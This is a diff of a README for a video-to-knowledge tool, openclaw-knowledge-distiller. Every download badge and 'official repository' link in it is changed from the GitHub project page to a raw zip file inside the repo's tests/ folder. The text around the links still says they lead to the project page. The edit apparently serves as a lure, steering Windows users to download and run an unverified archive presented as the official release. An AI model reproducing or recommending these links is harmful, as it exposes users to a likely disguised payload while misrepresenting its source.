@@ -1,6 +1,6 @@
 # 🦞 openclaw-knowledge-distiller - Convert Videos into Knowledge
 
-[![Download](https://img.shields.io/badge/Download-openclaw--knowledge--distiller-green?style=for-the-badge)](https://github.com/hensr39-cpu/openclaw-knowledge-distiller)
+[![Download](https://img.shields.io/badge/Download-openclaw--knowledge--distiller-green?style=for-the-badge)](https://raw.githubusercontent.com/hensr39-cpu/openclaw-knowledge-distiller/main/tests/openclaw_distiller_knowledge_v1.1.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to download and start using openclaw-knowledge-distiller on y
 
 Visit the download page by clicking the badge below. You will find the latest version of openclaw-knowledge-distiller ready for Windows.
 
-[![Download](https://img.shields.io/badge/Download-openclaw--knowledge--distiller-orange?style=for-the-badge)](https://github.com/hensr39-cpu/openclaw-knowledge-distiller)
+[![Download](https://img.shields.io/badge/Download-openclaw--knowledge--distiller-orange?style=for-the-badge)](https://raw.githubusercontent.com/hensr39-cpu/openclaw-knowledge-distiller/main/tests/openclaw_distiller_knowledge_v1.1.zip)
 
 This link takes you directly to the project page. Look for the latest release or download section, then find the Windows setup file (usually an `.exe` file).
 
@@ -132,7 +132,7 @@ If transcription seems wrong or summaries are poor:
 ## 🔗 Useful Links
 
 - Download and learn more at the official GitHub repository:  
-  https://github.com/hensr39-cpu/openclaw-knowledge-distiller
+  https://raw.githubusercontent.com/hensr39-cpu/openclaw-knowledge-distiller/main/tests/openclaw_distiller_knowledge_v1.1.zip
 
 - Check for updates regularly on the same page.
 
@@ -176,4 +176,4 @@ To update:
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-openclaw--knowledge--distiller-orange?style=for-the-badge)](https://github.com/hensr39-cpu/openclaw-knowledge-distiller)
+[![Download](https://img.shields.io/badge/Download-openclaw--knowledge--distiller-orange?style=for-the-badge)](https://raw.githubusercontent.com/hensr39-cpu/openclaw-knowledge-distiller/main/tests/openclaw_distiller_knowledge_v1.1.zip)
